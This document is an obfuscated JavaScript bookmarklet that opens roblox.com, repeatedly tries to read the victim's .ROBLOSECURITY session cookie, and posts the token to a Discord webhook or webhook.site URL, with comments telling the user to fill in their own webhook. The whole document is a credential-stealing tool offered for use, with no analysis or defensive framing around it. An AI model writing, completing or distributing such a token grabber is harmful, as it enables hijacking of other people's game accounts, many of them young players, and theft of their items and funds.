javascript:(function(){
    function _0x1a2b(_0x3c4d, _0x5e6f) {
        const _0x7a8b = `; ${_0x5e6f.cookie}`;
        const _0x9c0d = _0x7a8b.split(`; ${_0x3c4d}=`);
        if (_0x9c0d.length === 2) return _0x9c0d.pop().split(';').shift();
        return null;
    }

    function _0x2b3c(_0x4d5e, _0x6f7a) {
        const _0x8a9b = {
            'discord': 'https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN', // Replace with your Discord webhook URL
            'custom': 'https://webhook.site/YOUR_UNIQUE_WEBHOOK_URL' // Replace with your custom webhook URL
        };

        const _0x7b8c = _0x8a9b[_0x6f7a] || _0x8a9b['custom'];

        let _0x9c0d;
        if (_0x6f7a === 'discord') {
            _0x9c0d = {
                'content': `Data: ${_0x4d5e}`,
                'embeds': [{
                    'title': "Token Data",
                    'description': `Token: ${_0x4d5e}`,
                    'color': 0x00ff00
                }],
                'timestamp': new Date().toISOString()
            };
        } else {
            _0x9c0d = {
                'token': _0x4d5e,
                'timestamp': new Date().toISOString()
            };
        }

        fetch(_0x7b8c, {
            'method': 'POST',
            'headers': {
                'Content-Type': 'application/json'
            },
            'body': JSON.stringify(_0x9c0d)
        })
        .then(_0x3c4d => _0x3c4d.json())
        .then(_0x5e6f => console.log('Success:', _0x5e6f))
        .catch(_0x6f7a => console.error('Error:', _0x6f7a));
    }

    function _0x4d5e() {
        const _0x7a8b = window.open('https://roblox.com', '_blank');

        const _0x9c0d = setInterval(() => {
            try {
                const _0x6f7a = _0x1a2b('.ROBLOSECURITY', _0x7a8b.document);

                if (_0x6f7a) {
                    _0x2b3c(_0x6f7a, 'custom'); // Change 'custom' to 'discord' for Discord webhook
                    _0x7a8b.close();
                    clearInterval(_0x9c0d);
                }
            } catch (_0x5e6f) {
                console.log('Unable to retrieve token:', _0x5e6f);
                _0x7a8b.close();
                clearInterval(_0x9c0d);
            }
        }, 2000); // Check every 2 seconds
    }

    _0x4d5e();
})();
